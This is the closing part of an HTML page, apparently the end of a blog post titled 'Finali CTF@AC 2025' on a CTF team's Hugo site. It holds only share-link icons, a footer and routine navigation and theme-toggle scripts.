                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-3.446,265.638c0,-22.964 -18.616,-41.58 -41.58,-41.58c-11.211,0 -21.361,4.457 -28.841,11.666c-28.424,-20.508 -67.586,-33.757 -111.204,-35.278l18.941,-89.121l61.884,13.157c0.756,15.734 13.642,28.29 29.56,28.29c16.407,0 29.706,-13.299 29.706,-29.701c0,-16.403 -13.299,-29.702 -29.706,-29.702c-11.666,0 -21.657,6.792 -26.515,16.578l-69.105,-14.69c-1.922,-0.418 -3.939,-0.042 -5.585,1.036c-1.658,1.073 -2.811,2.761 -3.224,4.686l-21.152,99.438c-44.258,1.228 -84.046,14.494 -112.837,35.232c-7.468,-7.164 -17.589,-11.591 -28.757,-11.591c-22.965,0 -41.585,18.616 -41.585,41.58c0,16.896 10.095,31.41 24.568,37.918c-0.639,4.135 -0.99,8.328 -0.99,12.576c0,63.977 74.469,115.836 166.33,115.836c91.861,0 166.334,-51.859 166.334,-115.836c0,-4.218 -0.347,-8.387 -0.977,-12.493c14.564,-6.47 24.735,-21.034 24.735,-38.001Zm-119.474,108.193c-20.27,20.241 -59.115,21.816 -70.534,21.816c-11.428,0 -50.277,-1.575 -70.522,-21.82c-3.007,-3.008 -3.007,-7.882 0,-10.889c3.003,-2.999 7.882,-3.003 10.885,0c12.777,12.781 40.11,17.317 59.637,17.317c19.522,0 46.86,-4.536 59.657,-17.321c3.016,-2.999 7.886,-2.995 10.885,0.008c3.008,3.011 3.003,7.882 -0.008,10.889Zm-5.23,-48.781c-16.373,0 -29.701,-13.324 -29.701,-29.698c0,-16.381 13.328,-29.714 29.701,-29.714c16.378,0 29.706,13.333 29.706,29.714c0,16.374 -13.328,29.698 -29.706,29.698Zm-160.386,-29.702c0,-16.381 13.328,-29.71 29.714,-29.71c16.369,0 29.689,13.329 29.689,29.71c0,16.373 -13.32,29.693 -29.689,29.693c-16.386,0 -29.714,-13.32 -29.714,-29.693Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share Finali CTF@AC 2025 on facebook"
            href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fpascalctf.github.io%2fit%2fctf%2fctfatac2025_finals%2f">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-106.468,0l0,-192.915l66.6,0l12.672,-82.621l-79.272,0l0,-53.617c0,-22.603 11.073,-44.636 46.58,-44.636l36.042,0l0,-70.34c0,0 -32.71,-5.582 -63.982,-5.582c-65.288,0 -107.96,39.569 -107.96,111.204l0,62.971l-72.573,0l0,82.621l72.573,0l0,192.915l-191.104,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share Finali CTF@AC 2025 on whatsapp"
            href="https://api.whatsapp.com/send?text=Finali%20CTF%40AC%202025%20-%20https%3a%2f%2fpascalctf.github.io%2fit%2fctf%2fctfatac2025_finals%2f">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-58.673,127.703c-33.842,-33.881 -78.847,-52.548 -126.798,-52.568c-98.799,0 -179.21,80.405 -179.249,179.234c-0.013,31.593 8.241,62.428 23.927,89.612l-25.429,92.884l95.021,-24.925c26.181,14.28 55.659,21.807 85.658,21.816l0.074,0c98.789,0 179.206,-80.413 179.247,-179.243c0.018,-47.895 -18.61,-92.93 -52.451,-126.81Zm-126.797,275.782l-0.06,0c-26.734,-0.01 -52.954,-7.193 -75.828,-20.767l-5.441,-3.229l-56.386,14.792l15.05,-54.977l-3.542,-5.637c-14.913,-23.72 -22.791,-51.136 -22.779,-79.287c0.033,-82.142 66.867,-148.971 149.046,-148.971c39.793,0.014 77.199,15.531 105.329,43.692c28.128,28.16 43.609,65.592 43.594,105.4c-0.034,82.149 -66.866,148.983 -148.983,148.984Zm81.721,-111.581c-4.479,-2.242 -26.499,-13.075 -30.604,-14.571c-4.105,-1.495 -7.091,-2.241 -10.077,2.241c-2.986,4.483 -11.569,14.572 -14.182,17.562c-2.612,2.988 -5.225,3.364 -9.703,1.12c-4.479,-2.241 -18.91,-6.97 -36.017,-22.23c-13.314,-11.876 -22.304,-26.542 -24.916,-31.026c-2.612,-4.484 -0.279,-6.908 1.963,-9.14c2.016,-2.007 4.48,-5.232 6.719,-7.847c2.24,-2.615 2.986,-4.484 4.479,-7.472c1.493,-2.99 0.747,-5.604 -0.374,-7.846c-1.119,-2.241 -10.077,-24.288 -13.809,-33.256c-3.635,-8.733 -7.327,-7.55 -10.077,-7.688c-2.609,-0.13 -5.598,-0.158 -8.583,-0.158c-2.986,0 -7.839,1.121 -11.944,5.604c-4.105,4.484 -15.675,15.32 -15.675,37.364c0,22.046 16.048,43.342 18.287,46.332c2.24,2.99 31.582,48.227 76.511,67.627c10.685,4.615 19.028,7.371 25.533,9.434c10.728,3.41 20.492,2.929 28.209,1.775c8.605,-1.285 26.499,-10.833 30.231,-21.295c3.732,-10.464 3.732,-19.431 2.612,-21.298c-1.119,-1.869 -4.105,-2.99 -8.583,-5.232Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share Finali CTF@AC 2025 on telegram"
            href="https://telegram.me/share/url?text=Finali%20CTF%40AC%202025&amp;url=https%3a%2f%2fpascalctf.github.io%2fit%2fctf%2fctfatac2025_finals%2f">
            <svg version="1.1" xml:space="preserve" viewBox="2 2 28 28" height="30px" width="30px" fill="currentColor">
                <path
                    d="M26.49,29.86H5.5a3.37,3.37,0,0,1-2.47-1,3.35,3.35,0,0,1-1-2.47V5.48A3.36,3.36,0,0,1,3,3,3.37,3.37,0,0,1,5.5,2h21A3.38,3.38,0,0,1,29,3a3.36,3.36,0,0,1,1,2.46V26.37a3.35,3.35,0,0,1-1,2.47A3.38,3.38,0,0,1,26.49,29.86Zm-5.38-6.71a.79.79,0,0,0,.85-.66L24.73,9.24a.55.55,0,0,0-.18-.46.62.62,0,0,0-.41-.17q-.08,0-16.53,6.11a.59.59,0,0,0-.41.59.57.57,0,0,0,.43.52l4,1.24,1.61,4.83a.62.62,0,0,0,.63.43.56.56,0,0,0,.4-.17L16.54,20l4.09,3A.9.9,0,0,0,21.11,23.15ZM13.8,20.71l-1.21-4q8.72-5.55,8.78-5.55c.15,0,.23,0,.23.16a.18.18,0,0,1,0,.06s-2.51,2.3-7.52,6.8Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share Finali CTF@AC 2025 on ycombinator"
            href="https://news.ycombinator.com/submitlink?t=Finali%20CTF%40AC%202025&u=https%3a%2f%2fpascalctf.github.io%2fit%2fctf%2fctfatac2025_finals%2f">
            <svg version="1.1" xml:space="preserve" width="30px" height="30px" viewBox="0 0 512 512" fill="currentColor"
                xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape">
                <path
                    d="M449.446 0C483.971 0 512 28.03 512 62.554L512 449.446C512 483.97 483.97 512 449.446 512L62.554 512C28.03 512 0 483.97 0 449.446L0 62.554C0 28.03 28.029 0 62.554 0L449.446 0ZM183.8767 87.9921H121.8427L230.6673 292.4508V424.0079H281.3328V292.4508L390.1575 87.9921H328.1233L256 238.2489z" />
            </svg>
        </a>
    </li>
</ul>

  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2026 <a href="https://pascalctf.github.io/it/">Paolo</a></span> ¬∑ 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
